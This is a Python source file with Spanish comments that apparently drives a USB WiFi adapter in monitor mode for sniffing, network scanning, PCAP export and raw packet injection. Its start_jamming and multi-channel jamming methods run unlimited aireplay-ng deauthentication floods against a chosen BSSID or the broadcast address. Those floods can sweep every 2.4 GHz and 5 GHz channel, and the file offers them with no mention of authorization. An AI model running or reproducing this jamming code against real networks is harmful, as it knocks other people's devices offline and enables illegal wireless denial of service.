"""
Controlador WiFi mejorado para adaptador BrosTrend AC1200 AC3L
Versión mejorada con mejor manejo de errores, performance y funcionalidades
"""

import subprocess
import time
import os
import sys
import struct
import threading
import queue
from collections import deque
from typing import Optional, List, Tuple, Dict, Callable
from dataclasses import dataclass

try:
    from scapy.all import *
    from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeReq, Dot11ProbeResp, RadioTap, Dot11Elt
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("ADVERTENCIA: scapy no disponible. Instala con: pip install scapy")

try:
    import pyric.pyw as pyw
    PYRIC_AVAILABLE = True
except ImportError:
    PYRIC_AVAILABLE = False


@dataclass
class WiFiNetwork:
    """Información de una red WiFi detectada"""
    ssid: str
    bssid: str
    channel: int
    rssi: int
    encryption: str
    last_seen: float


@dataclass
class WiFiPacket:
    """Paquete WiFi con metadatos"""
    data: bytes
    rssi: int
    channel: int
    timestamp: float
    packet_type: str
    bssid: Optional[str] = None
    ssid: Optional[str] = None


class CircularBuffer:
    """Buffer circular para evitar pérdida de datos"""
    def __init__(self, size: int):
        self.buffer = deque(maxlen=size)
        self.size = size
        self.dropped = 0
    
    def add(self, item):
        """Añade un elemento al buffer"""
        if len(self.buffer) >= self.size:
            self.dropped += 1
        self.buffer.append(item)
    
    def get(self, count: int = 1) -> List:
        """Obtiene elementos del buffer"""
        items = []
        for _ in range(min(count, len(self.buffer))):
            if self.buffer:
                items.append(self.buffer.popleft())
        return items
    
    def peek(self, count: int = 1) -> List:
        """Observa elementos sin quitarlos"""
        return list(self.buffer)[:count]
    
    def clear(self):
        """Limpia el buffer"""
        self.buffer.clear()
        self.dropped = 0
    
    def __len__(self):
        return len(self.buffer)


class WiFiDriver:
    """Controlador mejorado para adaptador WiFi en modo monitor"""
    
    # Canales WiFi
    CHANNELS_2_4 = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14]
    CHANNELS_5 = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165]
    
    def __init__(self, interface: str = None, auto_detect: bool = True):
        """Inicializa el controlador WiFi mejorado
        
        Args:
            interface: Nombre de la interfaz WiFi (ej: 'wlan0', 'wlan1')
                     Si es None y auto_detect=True, intentará detectar automáticamente
            auto_detect: Si True, detecta automáticamente la interfaz
        """
        self.interface = interface
        self.monitor_interface = None
        self.current_channel = 1
        self.current_band = "2.4"  # "2.4" o "5"
        self.monitor_mode = False
        self.last_packet = None
        self.last_rssi = 0
        self.last_channel = 0
        
        # Estadísticas
        self.packets_received = 0
        self.packets_sent = 0
        self.packets_dropped = 0
        self.start_time = time.time()
        
        # Buffer circular para paquetes
        self.packet_buffer = CircularBuffer(1000)
        
        # Redes WiFi detectadas
        self.networks: Dict[str, WiFiNetwork] = {}
        
        # Threading para captura asíncrona
        self.capture_thread = None
        self.capture_active = False
        self.packet_queue = queue.Queue(maxsize=500)
        
        # Jamming de banda completa
        self.jam_all_bands_active = False
        self.jam_thread = None
        
        # Filtros
        self.bssid_filter: Optional[str] = None
        self.ssid_filter: Optional[str] = None
        self.packet_type_filter: Optional[str] = None
        
        # Verificar permisos (solo en Unix/Linux)
        try:
            if hasattr(os, 'geteuid') and os.geteuid() != 0:
                print("ADVERTENCIA: Se recomienda ejecutar con sudo para mejor funcionalidad.")
        except AttributeError:
            # Windows no tiene geteuid()
            pass
        
        # Detectar interfaz si no se especifica
        if not self.interface and auto_detect:
            interfaces = self.list_available_interfaces()
            if interfaces:
                self.interface = interfaces[0]
                print(f"Interfaz detectada automáticamente: {self.interface}")
            else:
                raise RuntimeError("No se pudo detectar adaptador WiFi. Verifica la conexión.")
        
        if not self.interface:
            raise ValueError("No se especificó interfaz WiFi")
        
        # Verificar que la interfaz existe
        if not self._interface_exists(self.interface):
            raise RuntimeError(f"La interfaz {self.interface} no existe o no está disponible.")
        
        # Verificar capacidades del adaptador
        self._check_adapter_capabilities()
        
        print(f"Adaptador WiFi inicializado: {self.interface}")
    
    def list_available_interfaces(self) -> List[str]:
        """Lista todas las interfaces WiFi disponibles"""
        interfaces = []
        
        try:
            # Intentar usar pyric (más confiable)
            if PYRIC_AVAILABLE:
                try:
                    cards = pyw.get_wireless_interfaces()
                    if cards:
                        interfaces.extend(cards)
                except:
                    pass
            
            # Fallback: usar iw
            try:
                result = subprocess.run(['iw', 'dev'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if 'Interface' in line:
                            parts = line.split()
                            if len(parts) > 1:
                                iface = parts[1]
                                if iface not in interfaces:
                                    interfaces.append(iface)
            except:
                pass
            
            # Alternativa con ip
            try:
                result = subprocess.run(['ip', 'link', 'show'], capture_output=True, text=True, timeout=5)
                if result.returncode == 0:
                    for line in result.stdout.split('\n'):
                        if ': ' in line and ('wl' in line.lower() or 'wlan' in line.lower()):
                            parts = line.split(':')
                            if len(parts) >= 2:
                                iface = parts[1].strip().split()[0]
                                if iface not in interfaces and iface:
                                    interfaces.append(iface)
            except:
                pass
        
        except Exception as e:
            print(f"Error listando interfaces: {e}")
        
        return interfaces
    
    def _interface_exists(self, interface: str) -> bool:
        """Verifica si una interfaz existe"""
        try:
            result = subprocess.run(['iw', 'dev', interface, 'info'], 
                                  capture_output=True, timeout=3)
            return result.returncode == 0
        except:
            # Fallback
            interfaces = self.list_available_interfaces()
            return interface in interfaces
    
    def _check_adapter_capabilities(self):
        """Verifica las capacidades del adaptador"""
        try:
            result = subprocess.run(['iw', 'phy', 'phy0', 'info'], 
                                  capture_output=True, text=True, timeout=5)
            if result.returncode != 0:
                # Intentar obtener phy desde la interfaz
                result = subprocess.run(['iw', 'dev', self.interface, 'info'], 
                                      capture_output=True, text=True, timeout=5)
            
            if result.returncode == 0:
                output = result.stdout
                has_monitor = 'monitor' in output.lower()
                has_injection = 'injection' in output.lower() or 'tx' in output.lower()
                
                if not has_monitor:
                    print("ADVERTENCIA: El adaptador puede no soportar modo monitor completamente.")
                if not has_injection:
                    print("ADVERTENCIA: El adaptador puede no soportar inyección de paquetes.")
        
        except Exception as e:
            print(f"Advertencia: No se pudo verificar capacidades del adaptador: {e}")
    
    def set_monitor_mode(self, enable: bool = True) -> bool:
        """Activa o desactiva modo monitor con mejor manejo de errores"""
        if not SCAPY_AVAILABLE:
            print("ERROR: scapy no está disponible. Instala con: pip install scapy")
            return False
        
        # Verificar permisos
        try:
            if enable and hasattr(os, 'geteuid') and os.geteuid() != 0:
                print("ADVERTENCIA: Modo monitor requiere permisos de administrador (sudo)")
        except AttributeError:
            pass
        
        try:
            if enable and not self.monitor_mode:
                # PASO 1: Liberar interfaz - Detener procesos que bloquean
                print("Liberando interfaz WiFi...")
                try:
                    subprocess.run(['sudo', 'airmon-ng', 'check', 'kill'], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=15)
                    time.sleep(1)
                except (subprocess.TimeoutExpired, Exception):
                    pass
                
                # PASO 2: Desactivar NetworkManager para esta interfaz
                try:
                    subprocess.run(['sudo', 'nmcli', 'device', 'set', self.interface, 'managed', 'no'], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
                    time.sleep(0.5)
                except Exception:
                    pass
                
                # PASO 3: Bajar la interfaz antes de cambiar modo
                try:
                    subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'down'], 
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=5)
                    time.sleep(0.5)
                except Exception:
                    pass
                
                # PASO 4: Intentar activar modo monitor
                airmon_available = self._check_command_available('airmon-ng')
                
                if airmon_available:
                    # Intentar con airmon-ng primero (más confiable)
                    try:
                        result = subprocess.run(['sudo', 'airmon-ng', 'start', self.interface], 
                                              capture_output=True, text=True, timeout=15)
                        if result.returncode == 0:
                            # Buscar nueva interfaz monitor
                            for line in result.stdout.split('\n'):
                                if 'monitor mode' in line.lower() or 'mon' in line.lower():
                                    parts = line.split()
                                    for part in parts:
                                        if self.interface in part and 'mon' in part:
                                            self.monitor_interface = part
                                            break
                                    if self.monitor_interface:
                                        break
                            
                            # Si no se encontró, buscar patrones comunes
                            if not self.monitor_interface:
                                monitor_names = [f"{self.interface}mon", f"mon{self.interface[4:]}", f"{self.interface}mon0"]
                                for name in monitor_names:
                                    if self._interface_exists(name):
                                        self.monitor_interface = name
                                        break
                    except subprocess.TimeoutExpired:
                        print("ADVERTENCIA: Timeout con airmon-ng, intentando método alternativo...")
                
                # Fallback: usar iw directamente
                if not self.monitor_interface:
                    try:
                        # Cambiar a modo monitor con iw
                        result = subprocess.run(['sudo', 'iw', self.interface, 'set', 'type', 'monitor'], 
                                              stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
                        if result.returncode == 0:
                            # Subir la interfaz
                            subprocess.run(['sudo', 'ip', 'link', 'set', self.interface, 'up'], 
                                         stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
                            self.monitor_interface = self.interface
                        else:
                            error_msg = result.stderr.decode('utf-8', errors='ignore') if result.stderr else ""
                            if "Device or resource busy" in error_msg:
                                print("ERROR: La interfaz está siendo usada por otro proceso.")
                                print("Intenta manualmente: sudo airmon-ng check kill")
                                return False
                    except subprocess.TimeoutExpired:
                        print("ERROR: Timeout cambiando a modo monitor")
                        return False
                    except Exception as e:
                        print(f"ERROR: {e}")
                        return False
                
                if self.monitor_interface:
                    self.monitor_mode = True
                    print(f"Modo monitor activado en {self.monitor_interface}")
                    
                    # Iniciar captura asíncrona
                    self._start_capture_thread()
                    return True
                else:
                    print("ERROR: No se pudo crear interfaz en modo monitor")
                    print("Sugerencias:")
                    print("  1. Ejecuta: sudo airmon-ng check kill")
                    print("  2. Ejecuta: sudo nmcli device set wlan1 managed no")
                    print("  3. Verifica que el adaptador soporte modo monitor: iw phy phy1 info")
                    return False
            
            elif not enable and self.monitor_mode:
                # Detener captura
                self._stop_capture_thread()
                
                # Desactivar modo monitor
                try:
                    if self.monitor_interface and self.monitor_interface != self.interface:
                        subprocess.run(['sudo', 'airmon-ng', 'stop', self.monitor_interface], 
                                     capture_output=True, timeout=10)
                    elif self.monitor_interface:
                        # Restaurar modo managed
                        subprocess.run(['sudo', 'iw', self.interface, 'set', 'type', 'managed'], 
                                     capture_output=True, timeout=5)
                    
                    self.monitor_mode = False
                    self.monitor_interface = None
                    return True
                except Exception as e:
                    print(f"Error desactivando modo monitor: {e}")
                    return False
            
            return True
        
        except subprocess.TimeoutExpired:
            print("ERROR: Timeout esperando respuesta del sistema")
            return False
        except PermissionError:
            print("ERROR: Permisos insuficientes. Ejecuta con sudo.")
            return False
        except Exception as e:
            print(f"ERROR en set_monitor_mode: {e}")
            return False
    
    def _check_command_available(self, command: str) -> bool:
        """Verifica si un comando está disponible (multiplataforma)"""
        try:
            # Windows usa 'where', Unix/Linux usa 'which'
            if sys.platform == 'win32':
                cmd = ['where', command]
            else:
                cmd = ['which', command]
            result = subprocess.run(cmd, capture_output=True, timeout=2)
            return result.returncode == 0
        except:
            return False
    
    def _start_capture_thread(self):
        """Inicia thread para captura asíncrona de paquetes"""
        if self.capture_thread and self.capture_thread.is_alive():
            return
        
        self.capture_active = True
        self.capture_thread = threading.Thread(target=self._capture_loop, daemon=True)
        self.capture_thread.start()
    
    def _stop_capture_thread(self):
        """Detiene el thread de captura"""
        self.capture_active = False
        if self.capture_thread:
            self.capture_thread.join(timeout=2)
    
    def _capture_loop(self):
        """Loop de captura de paquetes en thread separado"""
        if not SCAPY_AVAILABLE or not self.monitor_mode:
            return
        
        interface = self.monitor_interface or self.interface
        
        try:
            while self.capture_active:
                try:
                    # Capturar paquetes (no bloqueante si no hay)
                    # stop_filter retorna False para capturar todos los paquetes
                    packets = sniff(iface=interface, count=10, timeout=0.1, quiet=True)
                    
                    for packet in packets:
                        if not self.capture_active:
                            break
                        
                        # Aplicar filtros
                        if not self._packet_passes_filter(packet):
                            continue
                        
                        # Extraer información del paquete
                        wifi_pkt = self._parse_packet(packet)
                        
                        if wifi_pkt:
                            # Añadir a buffer circular
                            try:
                                self.packet_queue.put_nowait(wifi_pkt)
                                self.packet_buffer.add(wifi_pkt)
                                self.packets_received += 1
                                
                                # Actualizar última información
                                self.last_packet = wifi_pkt
                                self.last_rssi = wifi_pkt.rssi
                                self.last_channel = wifi_pkt.channel
                            except queue.Full:
                                self.packets_dropped += 1
                
                except Exception as e:
                    if self.capture_active:
                        time.sleep(0.1)  # Evitar loop infinito de errores
        
        except Exception as e:
            print(f"Error en thread de captura: {e}")
    
    def _parse_packet(self, packet) -> Optional[WiFiPacket]:
        """Parsea un paquete WiFi y extrae información"""
        try:
            rssi = -100
            channel = self.current_channel
            packet_type = "Unknown"
            bssid = None
            ssid = None
            
            # Extraer RSSI y canal
            if packet.haslayer(RadioTap):
                rssi = packet[RadioTap].dBm_AntSignal or -100
                channel = packet[RadioTap].Channel or self.current_channel
            
            # Extraer información de Dot11
            if packet.haslayer(Dot11):
                dot11 = packet[Dot11]
                bssid = dot11.addr3 if dot11.addr3 else (dot11.addr2 if dot11.addr2 else dot11.addr1)
                
                # Determinar tipo de paquete
                if packet.haslayer(Dot11Beacon):
                    packet_type = "Beacon"
                    # Extraer SSID
                    if packet.haslayer(Dot11Elt):
                        for elt in packet[Dot11Elt]:
                            if elt.ID == 0:  # SSID
                                ssid = elt.info.decode('utf-8', errors='ignore') if elt.info else "<hidden>"
                                break
                
                elif packet.haslayer(Dot11ProbeReq):
                    packet_type = "ProbeReq"
                elif packet.haslayer(Dot11ProbeResp):
                    packet_type = "ProbeResp"
                elif dot11.type == 0 and dot11.subtype == 8:
                    packet_type = "Beacon"
                elif dot11.type == 1:
                    packet_type = "Control"
                elif dot11.type == 2:
                    packet_type = "Data"
                else:
                    packet_type = f"Type{dot11.type}Subtype{dot11.subtype}"
            
            return WiFiPacket(
                data=bytes(packet),
                rssi=rssi,
                channel=channel,
                timestamp=time.time(),
                packet_type=packet_type,
                bssid=bssid,
                ssid=ssid
            )
        
        except Exception as e:
            return None
    
    def _packet_passes_filter(self, packet) -> bool:
        """Verifica si un paquete pasa los filtros configurados"""
        if not self.bssid_filter and not self.ssid_filter and not self.packet_type_filter:
            return True
        
        if packet.haslayer(Dot11):
            dot11 = packet[Dot11]
            
            # Filtro por BSSID
            if self.bssid_filter:
                bssid = dot11.addr3 if dot11.addr3 else (dot11.addr2 if dot11.addr2 else dot11.addr1)
                if bssid and self.bssid_filter.lower() != bssid.lower():
                    return False
            
            # Filtro por SSID
            if self.ssid_filter and packet.haslayer(Dot11Elt):
                for elt in packet[Dot11Elt]:
                    if elt.ID == 0:  # SSID
                        ssid = elt.info.decode('utf-8', errors='ignore') if elt.info else ""
                        if self.ssid_filter.lower() not in ssid.lower():
                            return False
                        break
            
            # Filtro por tipo de paquete
            if self.packet_type_filter:
                if self.packet_type_filter.lower() == "beacon" and not packet.haslayer(Dot11Beacon):
                    return False
                elif self.packet_type_filter.lower() == "data" and dot11.type != 2:
                    return False
        
        return True
    
    def set_channel(self, channel: int, silent: bool = False) -> bool:
        """Establece el canal WiFi con validación
        
        Args:
            channel: Canal a establecer
            silent: Si True, no imprime errores (útil para loops)
        """
        # Validar canal
        if channel not in self.CHANNELS_2_4 and channel not in self.CHANNELS_5:
            if not silent:
                print(f"ERROR: Canal {channel} no válido. Use 1-14 para 2.4GHz o 36-165 para 5GHz")
            return False
        
        if channel in self.CHANNELS_2_4:
            self.current_band = "2.4"
        elif channel in self.CHANNELS_5:
            self.current_band = "5"
        
        self.current_channel = channel
        
        try:
            interface = self.monitor_interface or self.interface
            if not interface:
                return False
            
            # Si la interfaz no está en modo monitor, intentar activarlo primero
            if not self.monitor_mode:
                if not silent:
                    print(f"ADVERTENCIA: Modo monitor no activo. Intentando activar...")
                self.set_monitor_mode(True)
            
            result = subprocess.run(['sudo', 'iw', 'dev', interface, 'set', 'channel', str(channel)], 
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)
            
            if result.returncode == 0:
                time.sleep(0.1)  # Esperar cambio de canal
                return True
            else:
                error_msg = result.stderr.decode('utf-8', errors='ignore') if result.stderr else "Unknown error"
                if not silent:
                    # Manejar errores específicos
                    if "Device or resource busy" in error_msg:
                        print(f"ERROR: Interfaz ocupada. Intenta: sudo airmon-ng check kill")
                    elif "disabled" not in error_msg.lower() and "invalid" not in error_msg.lower():
                        print(f"ERROR cambiando canal {channel}: {error_msg}")
                return False
        
        except subprocess.TimeoutExpired:
            if not silent:
                print("ERROR: Timeout cambiando canal")
            return False
        except Exception as e:
            if not silent:
                print(f"ERROR cambiando canal: {e}")
            return False
    
    def set_filter_bssid(self, bssid: Optional[str]):
        """Configura filtro por BSSID"""
        self.bssid_filter = bssid
    
    def set_filter_ssid(self, ssid: Optional[str]):
        """Configura filtro por SSID"""
        self.ssid_filter = ssid
    
    def set_filter_packet_type(self, ptype: Optional[str]):
        """Configura filtro por tipo de paquete"""
        self.packet_type_filter = ptype
    
    def get_rssi(self) -> int:
        """Obtiene RSSI del último paquete"""
        return self.last_rssi
    
    def get_channel(self) -> int:
        """Obtiene el canal actual"""
        return self.current_channel
    
    def get_statistics(self) -> Dict:
        """Obtiene estadísticas de tráfico"""
        elapsed = time.time() - self.start_time
        return {
            'packets_received': self.packets_received,
            'packets_sent': self.packets_sent,
            'packets_dropped': self.packets_dropped,
            'buffer_size': len(self.packet_buffer),
            'buffer_dropped': self.packet_buffer.dropped,
            'elapsed_time': elapsed,
            'packets_per_second': self.packets_received / elapsed if elapsed > 0 else 0,
            'networks_found': len(self.networks)
        }
    
    def scan_networks(self, duration: float = 2.0) -> List[WiFiNetwork]:
        """Escanea y lista redes WiFi disponibles"""
        if not self.monitor_mode:
            if not self.set_monitor_mode(True):
                return []
        
        networks = {}
        start_time = time.time()
        
        # Escanear todos los canales
        all_channels = self.CHANNELS_2_4 + self.CHANNELS_5
        
        for channel in all_channels:
            if time.time() - start_time > duration:
                break
            
            self.set_channel(channel)
            time.sleep(0.2)  # Esperar capturas en este canal
            
            # Obtener paquetes del buffer
            packets = self.packet_buffer.peek(100)
            
            for pkt in packets:
                if isinstance(pkt, WiFiPacket) and pkt.ssid and pkt.bssid:
                    key = pkt.bssid
                    if key not in networks or pkt.rssi > networks[key].rssi:
                        networks[key] = WiFiNetwork(
                            ssid=pkt.ssid,
                            bssid=pkt.bssid,
                            channel=pkt.channel,
                            rssi=pkt.rssi,
                            encryption="Unknown",  # Requeriría parsing adicional
                            last_seen=pkt.timestamp
                        )
        
        # Actualizar cache de redes
        self.networks.update(networks)
        
        # Ordenar por RSSI (mayor primero)
        network_list = sorted(networks.values(), key=lambda n: n.rssi, reverse=True)
        return network_list
    
    def scan_channels(self, start_channel: int, end_channel: int, callback=None) -> List[Tuple[int, int]]:
        """Escanea canales y retorna lista de (canal, rssi) con mejoras"""
        results = []
        channels_to_scan = []
        
        # Construir lista de canales a escanear
        for ch in range(start_channel, end_channel + 1):
            if ch in self.CHANNELS_2_4 or ch in self.CHANNELS_5:
                channels_to_scan.append(ch)
        
        for channel in channels_to_scan:
            self.set_channel(channel)
            time.sleep(0.15)  # Más tiempo para capturar paquetes
            
            # Obtener RSSI promedio de múltiples muestras
            rssi = self.get_channel_rssi_avg()
            results.append((channel, rssi))
            
            if callback:
                callback(channel, rssi)
        
        return results
    
    def get_channel_rssi_avg(self) -> int:
        """Obtiene RSSI promedio del canal actual (mejorado)"""
        if not SCAPY_AVAILABLE or not self.monitor_mode:
            return -100
        
        try:
            # Obtener paquetes del buffer recientes
            rssi_values = []
            packets = self.packet_buffer.peek(20)
            
            for pkt in packets:
                if isinstance(pkt, WiFiPacket) and pkt.channel == self.current_channel:
                    if -100 <= pkt.rssi <= 0:
                        rssi_values.append(pkt.rssi)
            
            if rssi_values:
                return int(sum(rssi_values) / len(rssi_values))
        
        except:
            pass
        
        return -100
    
    def receive_packet(self, timeout: float = 1.0) -> Optional[bytes]:
        """Recibe un paquete WiFi (mejorado con buffer)"""
        if not self.monitor_mode:
            return None
        
        try:
            # Intentar obtener del buffer primero
            if not self.packet_queue.empty():
                wifi_pkt = self.packet_queue.get(timeout=0.1)
                if wifi_pkt:
                    return wifi_pkt.data
            
            # Fallback: captura directa
            if SCAPY_AVAILABLE:
                interface = self.monitor_interface or self.interface
                packet = sniff(iface=interface, count=1, timeout=timeout, quiet=True)
                
                if packet:
                    wifi_pkt = self._parse_packet(packet[0])
                    if wifi_pkt:
                        return wifi_pkt.data
        
        except queue.Empty:
            pass
        except Exception:
            pass
        
        return None
    
    def send_packet(self, data: bytes) -> bool:
        """Envía un paquete WiFi con mejor manejo de errores"""
        if not SCAPY_AVAILABLE:
            return False
        
        if not self.monitor_mode:
            print("ERROR: Modo monitor no activado. No se pueden enviar paquetes.")
            return False
        
        try:
            interface = self.monitor_interface or self.interface
            if not interface:
                return False
            
            # Si los datos son un paquete Scapy completo
            try:
                packet = RadioTap(data)
                sendp(packet, iface=interface, verbose=False, count=1)
                self.packets_sent += 1
                return True
            except:
                pass
            
            # Si son datos raw, crear un paquete básico
            try:
                packet = RadioTap() / Dot11(type=2, subtype=0) / data
                sendp(packet, iface=interface, verbose=False, count=1)
                self.packets_sent += 1
                return True
            except Exception as e:
                print(f"ERROR enviando paquete: {e}")
                return False
        
        except Exception as e:
            print(f"ERROR en send_packet: {e}")
            return False
    
    def export_pcap(self, filename: str, packet_count: int = 100) -> bool:
        """Exporta paquetes a archivo PCAP (compatible con Wireshark)"""
        if not SCAPY_AVAILABLE:
            return False
        
        try:
            packets_to_export = []
            buffer_packets = self.packet_buffer.peek(packet_count)
            
            for wifi_pkt in buffer_packets:
                if isinstance(wifi_pkt, WiFiPacket):
                    try:
                        packet = RadioTap(wifi_pkt.data)
                        packets_to_export.append(packet)
                    except:
                        pass
            
            if packets_to_export:
                wrpcap(filename, packets_to_export)
                print(f"Exportados {len(packets_to_export)} paquetes a {filename}")
                return True
            else:
                print("No hay paquetes para exportar")
                return False
        
        except Exception as e:
            print(f"ERROR exportando PCAP: {e}")
            return False
    
    def start_jamming(self, target_bssid: Optional[str] = None, channel: Optional[int] = None, 
                     jam_mode: str = "channel") -> bool:
        """Inicia jamming WiFi usando aireplay-ng con mejor manejo
        
        Args:
            target_bssid: BSSID objetivo (None = broadcast)
            channel: Canal específico (None = canal actual, solo para jam_mode="channel")
            jam_mode: Modo de jamming:
                - "channel": Canal específico (2.4 o 5 GHz)
                - "band_2_4": Todos los canales 2.4 GHz (1-14)
                - "band_5": Todos los canales 5 GHz (36-165)
                - "all": Todos los canales en ambas bandas (2.4 y 5 GHz)
        """
        # Verificar que aireplay-ng esté disponible
        if not self._check_command_available('aireplay-ng'):
            print("ERROR: aireplay-ng no está instalado. Instala con: sudo apt install aircrack-ng")
            return False
        
        try:
            interface = self.monitor_interface or self.interface
            if not interface:
                return False
            
            if jam_mode == "channel":
                # Jamming en canal específico (comportamiento original)
                if channel:
                    self.set_channel(channel)
                
                # Usar aireplay-ng para deauth attack
                cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_bssid or 'FF:FF:FF:FF:FF:FF', interface]
                
                # Ejecutar en background
                self.jam_process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                
                # Verificar que inició correctamente
                time.sleep(0.5)
                if self.jam_process.poll() is not None:
                    # Proceso terminó prematuramente
                    stderr = self.jam_process.stderr.read().decode('utf-8', errors='ignore') if self.jam_process.stderr else ""
                    print(f"ERROR iniciando jamming: {stderr}")
                    return False
                
                return True
            
            else:
                # Jamming en múltiples canales - usar thread para cambiar canales
                self.jam_all_bands_active = True
                self.jam_process = None  # No usamos proceso único
                self.jam_thread = threading.Thread(target=self._jam_multiple_channels_loop, 
                                                   args=(target_bssid, jam_mode), daemon=True)
                self.jam_thread.start()
                return True
        
        except FileNotFoundError:
            print("ERROR: aireplay-ng no encontrado. Instala con: sudo apt install aircrack-ng")
            return False
        except Exception as e:
            print(f"ERROR iniciando jamming: {e}")
            return False
    
    def _jam_multiple_channels_loop(self, target_bssid: Optional[str] = None, jam_mode: str = "all"):
        """Loop para jamming en múltiples canales cambiando automáticamente"""
        interface = self.monitor_interface or self.interface
        if not interface:
            return
        
        # Determinar qué canales usar según el modo
        if jam_mode == "band_2_4":
            channels_to_jam = self.CHANNELS_2_4
        elif jam_mode == "band_5":
            channels_to_jam = self.CHANNELS_5
        elif jam_mode == "all":
            channels_to_jam = self.CHANNELS_2_4 + self.CHANNELS_5
        else:
            channels_to_jam = [self.current_channel]  # Fallback
        
        # Filtrar canales problemáticos comunes (DFS, deshabilitados)
        # Canales 5 GHz que requieren DFS y pueden estar deshabilitados
        problematic_channels = [52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144]
        
        while getattr(self, 'jam_all_bands_active', False):
            for channel in channels_to_jam:
                if not getattr(self, 'jam_all_bands_active', False):
                    break
                
                # Saltar canales problemáticos si fallan
                if channel in problematic_channels:
                    # Intentar cambiar, pero si falla, saltar silenciosamente
                    if not self.set_channel(channel, silent=True):
                        continue
                else:
                    # Para otros canales, intentar cambiar
                    if not self.set_channel(channel, silent=True):
                        continue
                
                try:
                    time.sleep(0.2)  # Pausa para cambio de canal
                    
                    # Iniciar deauth en este canal con más paquetes y tiempo
                    # Usar 0 para infinito, pero limitar tiempo de ejecución
                    cmd = ['sudo', 'aireplay-ng', '--deauth', '0', '-a', target_bssid or 'FF:FF:FF:FF:FF:FF', interface]
                    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    
                    # Esperar más tiempo en cada canal para que sea efectivo
                    # Para "all", usar menos tiempo por canal para cubrir más rápido
                    if jam_mode == "all":
                        wait_time = 0.8  # 0.8 segundos por canal cuando son muchos
                    elif jam_mode in ["band_2_4", "band_5"]:
                        wait_time = 1.2  # 1.2 segundos por canal cuando es una banda
                    else:
                        wait_time = 1.5  # 1.5 segundos por canal por defecto
                    
                    time.sleep(wait_time)
                    
                    # Terminar proceso antes de cambiar de canal
                    try:
                        process.terminate()
                        process.wait(timeout=1)
                    except:
                        try:
                            process.kill()
                            process.wait(timeout=1)
                        except:
                            pass
                
                except Exception as e:
                    # Continuar con siguiente canal si hay error
                    continue
    
    def stop_jamming(self):
        """Detiene el jamming con mejor manejo"""
        try:
            # Detener jamming de banda completa
            if hasattr(self, 'jam_all_bands_active'):
                self.jam_all_bands_active = False
                if hasattr(self, 'jam_thread') and self.jam_thread:
                    self.jam_thread.join(timeout=2)
            
            # Detener proceso de jamming normal
            if hasattr(self, 'jam_process') and self.jam_process:
                self.jam_process.terminate()
                try:
                    self.jam_process.wait(timeout=5)
                except subprocess.TimeoutExpired:
                    self.jam_process.kill()
                    self.jam_process.wait()
        except Exception as e:
            print(f"Advertencia al detener jamming: {e}")
    
    def check_receive_flag(self) -> bool:
        """Verifica si hay paquetes disponibles (mejorado con buffer)"""
        return not self.packet_queue.empty()
    
    def receive_data(self, buffer: bytearray) -> int:
        """Recibe datos y los coloca en el buffer (similar a CC1101)"""
        if not self.monitor_mode:
            return 0
        
        try:
            # Intentar obtener del buffer primero
            if not self.packet_queue.empty():
                wifi_pkt = self.packet_queue.get_nowait()
                if wifi_pkt:
                    data = wifi_pkt.data
                    length = min(len(data), len(buffer))
                    buffer[:length] = data[:length]
                    return length
            
            # Fallback: captura directa
            packet = self.receive_packet(timeout=0.05)
            if packet:
                length = min(len(packet), len(buffer))
                buffer[:length] = packet[:length]
                return length
        
        except queue.Empty:
            pass
        except Exception as e:
            pass
        
        return 0
    
    def send_data(self, data: bytes, length: Optional[int] = None) -> bool:
        """Envía datos (similar a CC1101)"""
        if length:
            data = data[:length]
        return self.send_packet(data)
    
    def cleanup(self):
        """Limpia recursos de forma segura"""
        try:
            self._stop_capture_thread()
            self.stop_jamming()
            if self.monitor_mode:
                self.set_monitor_mode(False)
            self.packet_buffer.clear()
            while not self.packet_queue.empty():
                try:
                    self.packet_queue.get_nowait()
                except queue.Empty:
                    break
        except Exception as e:
            print(f"Advertencia durante cleanup: {e}")
